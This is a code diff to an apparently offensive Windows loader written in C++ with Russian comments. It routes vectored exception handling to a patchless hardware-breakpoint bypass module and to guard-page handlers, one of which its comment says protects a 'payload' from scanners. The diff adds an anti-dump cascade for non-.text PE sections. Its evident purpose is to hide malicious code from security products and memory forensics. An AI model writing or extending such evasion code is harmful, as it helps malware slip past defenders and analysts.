@@ -11,6 +11,7 @@
 #include "VehDispatcher.h"
 #include "PatchlessBypass.h"
 #include "GuardPage.h"
+#include "AntiDump.h"
 #include "ApiResolver.h"
 
 namespace VehDispatcher
@@ -20,7 +21,7 @@ namespace VehDispatcher
     // ═══ Единый VEH-обработчик ═══
     // Диспетчеризация по коду исключения:
     //   STATUS_SINGLE_STEP          → PatchlessBypass (аппаратные BP)
-    //   STATUS_GUARD_PAGE_VIOLATION → GuardPage (защита payload от сканеров)
+    //   STATUS_GUARD_PAGE_VIOLATION → GuardPage → AntiDump (каскад)
     //   Всё остальное               → CONTINUE_SEARCH
     LONG CALLBACK UnifiedHandler(PEXCEPTION_POINTERS pExInfo)
     {
@@ -32,7 +33,15 @@ namespace VehDispatcher
             return PatchlessBypass::HandleSingleStep(pExInfo);
 
         case STATUS_GUARD_PAGE_VIOLATION:
-            return GuardPage::HandleGuardPage(pExInfo);
+        {
+            // GuardPage handles violations in the payload region.
+            // If GuardPage doesn't recognize the address, AntiDump
+            // checks its section guard pages (non-.text PE sections).
+            LONG result = GuardPage::HandleGuardPage(pExInfo);
+            if (result != EXCEPTION_CONTINUE_SEARCH)
+                return result;
+            return AntiDump::HandleGuardPage(pExInfo);
+        }
 
         default:
             return EXCEPTION_CONTINUE_SEARCH;
